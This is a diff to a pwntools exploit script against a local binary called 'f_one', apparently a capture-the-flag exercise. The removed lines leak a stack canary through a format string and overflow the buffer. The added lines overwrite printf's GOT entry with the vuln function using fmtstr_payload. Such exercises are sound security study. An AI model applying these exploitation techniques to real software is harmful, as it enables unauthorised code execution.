@@ -3,28 +3,21 @@ from pwn import *
 exe = './f_one'
 
 elf = context.binary = ELF(exe, checksec=False)
+libc = elf.libc
 
 context.log_level = 'debug'
 
 p = process(exe)
 
-offset = 56
+offset = 6
+vuln = elf.functions['vuln']
 
-p.sendlineafter('give me something:', '%13$p'.encode())
+payload = fmtstr_payload(offset, {elf.got.printf : elf.sym.vuln})
 
-p.recvline()
+p.sendafter('give me something:', payload)
 
-canary = int(p.recvline().strip(), 16)
+print(p.recvline())
 
-info('canary = {}'.format(canary)) # 56 + 8 + x = 72, x = 8
+p.send('test')
 
-log.info(p.clean())
-
-payload = flat([
-    b'A' * offset,
-    canary,
-    b'A' * 8,
-    elf.symbols.vuln
-])
-
-p.sendline(payload)
+print(p.recvall())
